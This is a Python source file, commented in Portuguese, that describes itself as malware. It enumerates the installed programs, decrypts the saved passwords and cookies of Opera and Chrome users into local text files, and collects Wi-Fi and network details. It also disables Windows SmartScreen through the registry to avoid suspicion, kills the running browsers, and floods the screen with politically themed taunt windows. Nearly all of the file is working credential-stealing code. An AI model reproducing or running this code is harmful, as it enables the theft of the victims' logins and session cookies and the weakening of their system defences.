import subprocess
import time
import os
import pywifi
from pywifi import const
import winreg
import json
import base64
import sqlite3
import shutil
import win32crypt
from datetime import datetime, timedelta
from Crypto.Cipher import AES
import ctypes, sys



def fake_file():
    # PARTE 1
    ## 1.1 COMANDOs DE PROCURA E HACKING DE APPS
    def listar_todos_programas():
        programas = set()

        # 1. REGISTRO DO WINDOWS
        caminhos_registro = [
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")
        ]
        for raiz, caminho in caminhos_registro:
            try:
                chave = winreg.OpenKey(raiz, caminho)
            except FileNotFoundError:
                continue
            for i in range(0, winreg.QueryInfoKey(chave)[0]):
                try:
                    subchave_nome = winreg.EnumKey(chave, i)
                    subchave = winreg.OpenKey(chave, subchave_nome)
                    nome = winreg.QueryValueEx(subchave, "DisplayName")[0]
                    try:
                        versao = winreg.QueryValueEx(subchave, "DisplayVersion")[0]
                    except FileNotFoundError:
                        versao = "?"
                    programas.add(f"{nome} - {versao}")
                except (FileNotFoundError, OSError):
                    continue

        # 2. PASTAS COMUNS DE INSTALAÇÃO
        caminhos_pastas = [
            r"C:\Program Files",
            r"C:\Program Files (x86)",
            os.path.expandvars(r"%LOCALAPPDATA%\Programs"),
            os.path.expandvars(r"%USERPROFILE%\AppData\Local"),
            os.path.expandvars(r"%USERPROFILE%\AppData\Roaming")
        ]
        for caminho in caminhos_pastas:
            if os.path.exists(caminho):
                for item in os.listdir(caminho):
                    full_path = os.path.join(caminho, item)
                    if os.path.isdir(full_path):
                        programas.add(item)

        return sorted(programas)
    programas = listar_todos_programas()
    
    # Salva todos os apps em apps_installed.txt e verifica navegadores específicos para hacking
    with open("0x_apps.txt", "a", encoding="utf-8") as f:
        for programa in programas:
            f.write(programa + "\n")
    with open("0x_apps.txt", "r", encoding="utf-8") as f:
        conteudo = f.read().lower()  
    
    # Opera
    if "opera" in conteudo:
        def fake_file_websites():

            # SENHAS
            def opera_gx_senha():
                local_state_path = os.path.join(os.environ['APPDATA'], r'Opera Software\Opera GX Stable\Local State')
                with open(local_state_path, 'r', encoding='utf-8') as file:
                    local_state = json.load(file)
                
                encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
                encrypted_key = encrypted_key[5:]  # Remove "DPAPI" prefix
                key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                return key
            def descriptografar(buff, key):
                try:
                    if buff.startswith(b'v10') or buff.startswith(b'v11'):
                        iv = buff[3:15]
                        payload = buff[15:]
                        cipher = AES.new(key, AES.MODE_GCM, iv)
                        decrypted = cipher.decrypt(payload)[:-16]
                        return decrypted.decode()
                    else:
                        return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode()
                except Exception as e:
                    return f"Erro ao descriptografar: {e}"
            def dados_de_login():
                db_path = os.path.join(os.environ['APPDATA'], r'Opera Software\Opera GX Stable\Login Data')
                filename = "OperaData.db"
                shutil.copyfile(db_path, filename)
                db = sqlite3.connect(filename)
                cursor = db.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")
                key = opera_gx_senha()
                for row in cursor.fetchall():
                    url = row[0]
                    username = row[1]
                    encrypted_password = row[2]
                    date_created = row[3]
                    password = descriptografar(encrypted_password, key)
                    if username or password:
                        with open("0x_senhasOpera.txt", "a", encoding="utf-8", errors="replace") as f:
                            f.write(f"Site: {url}")
                            f.write(f"Usuário: {username}")
                            f.write(f"Senha: {password}")
                            if date_created:
                                f.write(f"Criado em: {datetime(1601, 1, 1) + timedelta(microseconds=date_created)}")
                            f.write("="*50)
                cursor.close()
                db.close()
                os.remove(filename)
            
            # COOKIES
            def get_encryption_key(local_state_path):
                with open(local_state_path, "r", encoding="utf-8") as f:
                    local_state = json.load(f)
                encrypted_key = local_state["os_crypt"]["encrypted_key"]
                encrypted_key = base64.b64decode(encrypted_key)
                # Remove prefix "DPAPI"
                encrypted_key = encrypted_key[5:]
                key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                return key
            def decrypt_cookie(encrypted_value, key):
                try:
                    if encrypted_value[:3] == b'v10':

                        iv = encrypted_value[3:15]
                        payload = encrypted_value[15:-16]
                        tag = encrypted_value[-16:]
                        cipher = AES.new(key, AES.MODE_GCM, iv)
                        decrypted = cipher.decrypt_and_verify(payload, tag)
                    else:
                        # DPAPI
                        decrypted = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]

                    try:
                        return decrypted.decode('utf-8')
                    except UnicodeDecodeError:

                        return base64.b64encode(decrypted).decode('utf-8')
                except Exception as e:
                    return f"[Erro ao descriptografar]: {e}"
            def main():
                opera_paths = [
                    os.path.expandvars(r'%APPDATA%\Opera Software\Opera Stable'),
                    os.path.expandvars(r'%APPDATA%\Opera Software\Opera GX Stable')
                ]
                cookies_path = None
                local_state_path = None
                for path in opera_paths:
                    if os.path.exists(os.path.join(path, "Network", "Cookies")):
                        cookies_path = os.path.join(path, "Network", "Cookies")
                        local_state_path = os.path.join(path, "Local State")
                        break
                if not cookies_path or not local_state_path:
                    print("❌ Arquivo de cookies do Opera não encontrado.")
                    return
                key = get_encryption_key(local_state_path)
                temp_cookie_file = "Cookies_temp"
                shutil.copy2(cookies_path, temp_cookie_file)
                conn = sqlite3.connect(temp_cookie_file)
                cursor = conn.cursor()
                # Usa hex para evitar erro de UTF-8
                cursor.execute("SELECT host_key, name, hex(encrypted_value) FROM cookies")
                for host_key, name, hex_encrypted_value in cursor.fetchall():
                    try:
                        encrypted_value = bytes.fromhex(hex_encrypted_value)
                        decrypted_value = decrypt_cookie(encrypted_value, key)
                    except Exception as e:
                        decrypted_value = f"ERRO AO DESCRIPTOGRAFAR: {e}"

                    try:
                        with open("0x_cookiesOpera.txt", "a", encoding="utf-8", errors="replace") as f:
                            f.write(f"Site: {host_key} | Cookie: {name} = {decrypted_value}\n")
                    except Exception as e:
                        print(f"Erro ao escrever cookie de {host_key}: {e}")

                cursor.close()
                conn.close()
                time.sleep(1)
                os.remove(temp_cookie_file)
            dados_de_login()
            main()
        fake_file_websites()

    # Chrome
    if "chrome" in conteudo:
        def google():
            LOCAL_STATE_PATH = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Local State")
            COOKIES_DB_PATH = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies")
            LOGIN_DATA_PATH = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data")

            COOKIES_OUTPUT_FILE = "0x_cookiesGoogle.txt"
            PASSWORDS_OUTPUT_FILE = "0x_senhasGoogle.txt"

            def get_chrome_key():
                try:
                    with open(LOCAL_STATE_PATH, "r", encoding="utf-8") as f:
                        local_state = json.load(f)
                    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
                    key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                    return key
                except Exception as e:
                    print(f"[ERRO] Não foi possível obter a chave do Chrome: {e}")
                    return None

            def decrypt_value(encrypted_value, key):
                try:
                    if encrypted_value.startswith(b"v10") or encrypted_value.startswith(b"v11") or encrypted_value.startswith(b"v20"):
                        iv = encrypted_value[3:15]
                        payload = encrypted_value[15:]
                        cipher = AES.new(key, AES.MODE_GCM, iv)
                        decrypted = cipher.decrypt(payload)[:-16]

                        try:
                            return decrypted.decode("utf-8")
                        except UnicodeDecodeError:
                            decoded = decrypted.decode("utf-8", errors="replace")
                            return f"[BINÁRIO COM CARACTERES SUBSTITUÍDOS] {decoded} [HEX] {decrypted.hex()}"
                    else:
                        decrypted = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
                        try:
                            return decrypted.decode("utf-8")
                        except UnicodeDecodeError:
                            decoded = decrypted.decode("utf-8", errors="replace")
                            return f"[BINÁRIO COM CARACTERES SUBSTITUÍDOS] {decoded} [HEX] {decrypted.hex()}"
                except Exception as e:
                    return f"[ERRO AO DESCRIPTOGRAFAR: {e}]"

            def extract_cookies(key):
                if not os.path.exists(COOKIES_DB_PATH):
                    print(f"[ERRO] Arquivo de cookies não encontrado: {COOKIES_DB_PATH}")
                    return

                temp_db = "Cookies_temp.db"
                try:
                    shutil.copy2(COOKIES_DB_PATH, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
                    rows = cursor.fetchall()

                    with open(COOKIES_OUTPUT_FILE, "a", encoding="utf-8") as f:
                        f.write("\n[COOKIES - CHROME NETWORK]\n")
                        for host, name, encrypted_value in rows:
                            decrypted = decrypt_value(encrypted_value, key)
                            f.write(f"{host} | {name} | {decrypted}\n")

                    cursor.close()
                    conn.close()
                except Exception as e:
                    print(f"[ERRO] Falha ao extrair cookies: {e}")
                finally:
                    if os.path.exists(temp_db):
                        os.remove(temp_db)

            def extract_passwords(key):
                if not os.path.exists(LOGIN_DATA_PATH):
                    print(f"[ERRO] Arquivo Login Data não encontrado: {LOGIN_DATA_PATH}")
                    return

                temp_db = "LoginData_temp.db"
                try:
                    shutil.copy2(LOGIN_DATA_PATH, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    rows = cursor.fetchall()

                    with open(PASSWORDS_OUTPUT_FILE, "a", encoding="utf-8") as f:
                        f.write("\n[SENHAS SALVAS - CHROME]\n")
                        for url, username, encrypted_password in rows:
                            decrypted = decrypt_value(encrypted_password, key)
                            f.write(f"URL: {url} | USER: {username} | SENHA: {decrypted}\n")

                    cursor.close()
                    conn.close()
                except Exception as e:
                    print(f"[ERRO] Falha ao extrair senhas: {e}")
                finally:
                    if os.path.exists(temp_db):
                        os.remove(temp_db)

            def main():
                key = get_chrome_key()
                if key:
                    # Limpa os arquivos e escreve cabeçalho inicial
                    with open(COOKIES_OUTPUT_FILE, "w", encoding="utf-8") as f:
                        f.write("### Cookies extraídos do Chrome ###\n")
                    with open(PASSWORDS_OUTPUT_FILE, "w", encoding="utf-8") as f:
                        f.write("### Senhas extraídas do Chrome ###\n")

                    extract_cookies(key)
                    extract_passwords(key)
                else:
                    print("Chave de criptografia não encontrada.")
            main()
        google()

    ## 1.2 COMANDOS DE REDE INTERNET E FUTURO HACKING
    ### CASO INTERNET VIA WIFI
    def escanear_wifi():

        wifi = pywifi.PyWiFi()
        iface = wifi.interfaces()[0]  # Usa a primeira interface Wi-Fi
        iface.scan()             # Inicia o escaneamento
        time.sleep(3)            # Espera o scan terminar
        redes = iface.scan_results()
        with open("0x_wifi.txt", "a", encoding="utf-8") as f:
            for i, rede in enumerate(redes):
                f.write(f"{i+1}. SSID: {rede.ssid} | Sinal: {rede.signal}\n")
    
    ### Checa se wifi ou ethernet
    try:
        wifi_info = subprocess.check_output("netsh wlan show interfaces", shell=True, text=True).strip()
        if "SSID" in wifi_info:
            escanear_wifi()
            with open("0x_wifi.txt", "a", encoding="utf-8") as f:
                f.write(f"\n\n\n{wifi_info}")
        else:
            raise Exception("Sem conexão Wi-Fi.")
    except subprocess.CalledProcessError:
        ethernet_info = subprocess.check_output("ipconfig /all", shell=True, text=True).strip()
        with open("0x_wifi.txt", "a", encoding="utf-8") as f:
            f.write(ethernet_info)
    


    ## 2 ATAQUES
    ### Criar e mostrar o 1 aviso de hacking (cmd)
    for x in range(5): # MUDAR PARA MAIS EM ATAQUES REAIS
        os.system(f'start cmd /k "echo LULA LADRÃO  https://x.com/estte7end ROUBOU O https://x.com/estte7end MEU CORAÇÃO https://x.com/estte7end"')
        time.sleep(1)
    time.sleep(2)

    ### Criar e mostrar o 2 aviso de hacking (notas)
    with open("0x_hackedby.txt", "a", encoding="utf-8") as f:
        for x in range (10):
            f.write("\nLULA LADRÃO  https://x.com/estte7end ROUBOU O https://x.com/estte7end MEU CORAÇÃO https://x.com/estte7end\n")
    for x in range(5): #MUDAR PARA MAIS NÚMEROS EM ATAQUE REAL
        os.startfile("0x_hackedby.txt")
        time.sleep(1)
        os.system("taskkill /f /im notepad.exe")
 


    ## 3 TERMINAR ATAQUE MOSTRANDO INFORMAÇÕES
    arquivos_gerais = ["0x_wifi.txt", "0x_apps.txt"]
    with open("0x_geral.txt", "a", encoding="utf-8") as f_saida:
        f_saida.write("DADOS DO USUARIO:")
        for nome_arquivo in arquivos_gerais:
            if os.path.exists(nome_arquivo):
                f_saida.write(f"\n=== Conteúdo de: {nome_arquivo} ===\n")
                with open(nome_arquivo, "r", encoding="utf-8") as f_entrada:
                    f_saida.write(f_entrada.read())
                    f_saida.write("\n")
    os.startfile("0x_geral.txt")


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
if is_admin():
    comando = r'reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d Off /f'
    os.system(f'cmd /c "{comando}"')
else:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
# Adicionar smart screen denovo -> reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d Prompt /f
# verificar o smartcreen -> reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled


if __name__ == "__main__":

    # Retira o smartscreen para evitar suspeitas e problemas futuros
    is_admin()

    # Encerra os navegadores para evitar erros
    os.system("taskkill /F /IM cmd.exe")
    os.system("taskkill /F /IM opera.exe")
    os.system("taskkill /F /IM chrome.exe")

    # Chama o malware para coleta de dados
    fake_file()
